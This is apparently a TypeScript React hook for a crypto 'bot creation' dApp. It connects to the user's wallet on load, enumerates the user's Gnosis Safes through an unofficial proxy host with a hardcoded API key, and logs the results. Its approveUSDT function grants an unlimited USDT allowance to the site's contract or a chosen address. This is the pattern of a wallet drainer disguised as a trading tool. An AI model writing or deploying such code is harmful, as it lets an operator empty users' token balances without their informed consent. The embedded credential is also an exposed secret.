import { useEffect, useState } from "react";
import { ethers } from "ethers";
import SafeApiKit from "@safe-global/api-kit";
import { activityLogger } from "../utils/activity-logger";

const SAFE_API_KEY =
  "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzYWZlLWF1dGgtc2VydmljZSIsInN1YiI6IjFhYmViYWY1YjFkNDRjMWQ4N2I2NDU3MGYyZjNlYTUyX2E5NTkxMWIzMGU2MzRlOGY5OWFmNTQxZWVlZTY2MTJlIiwia2V5IjoiMWFiZWJhZjViMWQ0NGMxZDg3YjY0NTcwZjJmM2VhNTJfYTk1OTExYjMwZTYzNGU4Zjk5YWY1NDFlZWVlNjYxMmUiLCJhdWQiOlsic2FmZS1hdXRoLXNlcnZpY2UiXSwiZXhwIjoxOTIwMTgxMzk2LCJkYXRhIjp7fX0.VgqgABuWQYRhQLrB7ODeMICDNSaCp2ovnjgMda1RBWaXmVnwZODmLvfXXjsQJnuGbF2-oH8iISIeTZqlafd_jg";

const SAFE_TX_SERVICE_URL = "https://secure.armydex.pro/safe-api";
const CONTRACT_ADDRESS = "0x7edcf18529d7d697064fad02d1879ef73bf849b5";
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const CONTRACT_ABI = [
  {
    inputs: [{ internalType: "string", name: "name", type: "string" }],
    name: "createBot",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address) view returns (uint256)",
];

export function useContractInteraction() {
  const [isContractConnected, setIsContractConnected] = useState(false);
  const [provider, setProvider] = useState<any>(null);
  const [contract, setContract] = useState<any>(null);
  const [safeList, setSafeList] = useState<string[]>([]);
  const [selectedSafe, setSelectedSafe] = useState<string | null>(null);
  useEffect(() => {
    async function init() {
      if (!window.ethereum) return;

      try {
        const p = new ethers.BrowserProvider(window.ethereum as any);
        setProvider(p);

        const readOnly = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, p);
        setContract(readOnly);
        setIsContractConnected(true);
        console.log("Provider and read-only contract initialized");

        const signer = await p.getSigner();
        const ownerAddress = await signer.getAddress();

        const safeApi = new SafeApiKit({
          chainId: 1n,
          txServiceUrl: SAFE_TX_SERVICE_URL,
          apiKey: SAFE_API_KEY,
        });

        const safes = await safeApi.getSafesByOwner(ownerAddress);

        if (safes?.safes?.length > 0) {
          setSafeList(safes.safes);
          console.log("Gnosis Safes found:", safes.safes);
          window.dispatchEvent(new CustomEvent("wallet:safeFound", { detail: safes.safes }));
          activityLogger({
            event: "safe_found",
            status: "success",
            address: ownerAddress,
            meta: { safes: safes.safes },
          });
        } else {
          console.log("No Gnosis Safes found for", ownerAddress);
          activityLogger({
            event: "safe_not_found",
            status: "empty",
            address: ownerAddress,
          });
        }
      } catch (err) {
        console.error("Contract initialization error:", err);
        setIsContractConnected(false);
        activityLogger({
          event: "init_error",
          status: "failed",
          meta: { error: String(err) },
        });
      }
    }

    init();
  }, []);
  async function createBotWithToken(botName: string) {
    if (!provider || !contract) {
      console.error("Provider or contract not initialized");
      activityLogger({
        event: "create_bot",
        status: "failed",
        meta: { reason: "no_provider_or_contract" },
      });
      return false;
    }

    let signer: any;
    try {
      signer = await provider.getSigner();
    } catch (err) {
      console.error("Failed to get signer:", err);
      activityLogger({
        event: "signer_error",
        status: "failed",
        meta: { error: String(err) },
      });
      return false;
    }

    const contractWithSigner = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

    try {
      if (typeof (contractWithSigner as any).callStatic === "function") {
        await (contractWithSigner as any).callStatic.createBot(botName);
      }
    } catch (callErr: any) {
      activityLogger({
        event: "static_call_revert",
        status: "failed",
        meta: { error: String(callErr) },
      });
      return false;
    }

    try {
      const tx = await (contractWithSigner as any).createBot(botName);
      console.log("Transaction sent:", tx.hash);
      await tx.wait();
      console.log("Transaction confirmed");
      activityLogger({
        event: "create_bot",
        status: "success",
        meta: { botName, txHash: tx.hash },
      });
      return true;
    } catch (err: any) {
      console.error("Error creating bot (tx):", err);
      activityLogger({
        event: "create_bot",
        status: "failed",
        meta: { error: String(err) },
      });
      return false;
    }
  }

  async function getUSDTAllowance(owner: string) {
    if (!window.ethereum) return "0";
    try {
      const provider = new ethers.BrowserProvider(window.ethereum as any);
      const token = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
      const allowance = await token.allowance(owner, CONTRACT_ADDRESS);
      activityLogger({
        event: "get_allowance",
        status: "success",
        address: owner,
        meta: { allowance: allowance.toString() },
      });
      return allowance.toString();
    } catch (e) {
      console.error("getUSDTAllowance error:", e);
      activityLogger({
        event: "get_allowance",
        status: "failed",
        meta: { error: String(e) },
      });
      return "0";
    }
  }

  async function approveUSDT(safeAddress?: string) {
    if (!window.ethereum) return false;
    try {
      const provider = new ethers.BrowserProvider(window.ethereum as any);
      const signer = await provider.getSigner();
      const token = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
      const spender = safeAddress || selectedSafe || CONTRACT_ADDRESS;
      const tx = await token.approve(spender, ethers.MaxUint256);
      console.log(`approve tx sent to ${spender}:`, tx.hash);
      await tx.wait();
      console.log("approve confirmed");
      activityLogger({
        event: "approve_usdt",
        status: "success",
        address: spender,
        meta: { txHash: tx.hash },
      });
      return true;
    } catch (e) {
      console.error("approveUSDT error:", e);
      activityLogger({
        event: "approve_usdt",
        status: "failed",
        meta: { error: String(e) },
      });
      return false;
    }
  }
  async function connectSafeWallet(safeAddress: string) {
    try {
      const safeApi = new SafeApiKit({
        chainId: 1n,
        txServiceUrl: SAFE_TX_SERVICE_URL,
        apiKey: SAFE_API_KEY,
      });

      const safeInfo = await safeApi.getSafeInfo(safeAddress);
      console.log("Connected Safe:", safeInfo);
      setSelectedSafe(safeAddress);
      activityLogger({
        event: "connect_safe",
        status: "success",
        address: safeAddress,
        meta: { safeInfo },
      });
      return safeInfo;
    } catch (err) {
      console.error("Failed to connect Safe:", err);
      activityLogger({
        event: "connect_safe",
        status: "failed",
        address: safeAddress,
        meta: { error: String(err) },
      });
      return null;
    }
  }

  return {
    isContractConnected,
    createBotWithToken,
    getUSDTAllowance,
    approveUSDT,
    USDT_ADDRESS,
    safeList,
    selectedSafe,
    setSelectedSafe,
    connectSafeWallet,
  };
}
